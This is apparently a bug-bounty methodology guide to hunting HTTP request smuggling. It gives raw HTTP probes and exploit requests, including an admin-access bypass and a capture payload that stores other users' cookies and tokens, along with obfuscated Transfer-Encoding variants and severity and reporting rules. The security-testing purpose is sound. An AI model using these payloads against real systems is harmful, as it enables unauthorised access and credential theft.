# HTTP Request Smuggling — Hunting Methodology

## What Is HTTP Request Smuggling

When a front-end server (load balancer, WAF, CDN) and back-end server disagree on where one HTTP request ends and the next begins, an attacker can "smuggle" a hidden second request that is processed by the back-end as if it came from another user.

**Root cause:** Ambiguity in how `Content-Length` (CL) and `Transfer-Encoding` (TE) headers are prioritized by different servers.

---

## The Two Main Types

### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

Front-end reads body length from `Content-Length`, forwards full body to back-end. Back-end reads `Transfer-Encoding: chunked` and stops at `0\r\n\r\n`, leaving leftover bytes in the back-end's buffer as the start of the "next" request.

### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

Front-end reads chunked body and stops at `0`, but back-end reads `Content-Length` and expects more data. Front-end passes a short body, back-end waits for more — then another request's bytes arrive and get prepended.

### TE.TE — Both support TE, but one can be confused

Send an obfuscated `Transfer-Encoding` header that one server ignores:
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

---

## Detection

**Step 1 — Timing-based probe (CL.TE):**
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
If the request hangs for 10+ seconds → back-end is waiting for the chunk terminator → **CL.TE confirmed**.

**Step 2 — Timing-based probe (TE.CL):**
```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If request hangs → front-end sent the whole thing but back-end is waiting for CL bytes → **TE.CL confirmed**.

**Tool to suggest:** [Burp Suite HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) — automates detection and PoC generation.

> Always disable "Update Content-Length" in Burp Repeater when testing smuggling. Work in HTTP/1.1 only.

---

## Exploitation Techniques

### 1. Bypassing Front-End Access Controls

WAF/reverse proxy blocks `GET /admin`. Smuggle a request to `/admin` so the back-end processes it as a legitimate next request:

**CL.TE example:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: bar
```

The front-end sees a complete POST. The back-end sees the POST ending at `0` and then processes `GET /admin HTTP/1.1` as a new request from an internal source.

### 2. Capturing Other Users' Requests

Smuggle a partial request that causes the NEXT real user's request bytes to be appended to a controlled body. This effectively lets you read other users' cookies, auth tokens, and POST data.

**CL.TE capture attack:**
```http
POST / HTTP/1.1
Content-Length: 200
Transfer-Encoding: chunked

0

POST /store-comment HTTP/1.1
Host: target.com
Content-Length: 500

comment=
```
When next user's request arrives, it gets appended to `comment=` → their request headers (including cookies) are stored as a comment → attacker reads it.

### 3. Reflected XSS via Smuggling

If a back-end endpoint reflects input and there's a smuggling vulnerability, chain them:
```
Smuggled request → reflected endpoint → XSS without user interaction
```

### 4. Cache Poisoning via Smuggling

Poison a cached response with smuggled content:
1. Smuggle a request that gets a cacheable poisoned response
2. Next user requesting the same URL gets the poisoned response

---

## HTTP/2 Downgrade Smuggling

Modern infrastructure often uses HTTP/2 front-to-front but downgrades to HTTP/1.1 to the back-end. HTTP/2 doesn't have the TE ambiguity issue, but the downgrade reintroduces it. Test:

- `H2.CL` — HTTP/2 with a Content-Length header that causes confusion during downgrade
- `H2.TE` — HTTP/2 with a Transfer-Encoding header injected into the request

Burp's HTTP Request Smuggler handles H2 downgrade detection automatically.

---

## Impact Classification

| Scenario | Severity |
|---|---|
| Bypass front-end access control to reach admin | Critical |
| Capture other users' credentials/tokens | Critical |
| XSS without victim interaction via smuggling | High/Critical |
| Cache poisoning affecting all users | High/Critical |
| Confirmed smuggling with no exploitable backend behavior yet | Medium |
| Timing-based detection only (not confirmed exploitable) | Low/Medium |

## Evidence Requirements
- The exact request that demonstrates smuggling (with headers as-sent)
- Proof of impact: 403 → 200, captured victim cookie, or poisoned cache
- Response comparison showing the anomaly
- Note Burp extension used if applicable

## Do Not Report
- Smuggling on HTTP/2-only front-ends without downgrade (much harder)
- Timing anomalies without confirmed back-end behavior difference
- DE-SYNC issues on WebSockets without security impact
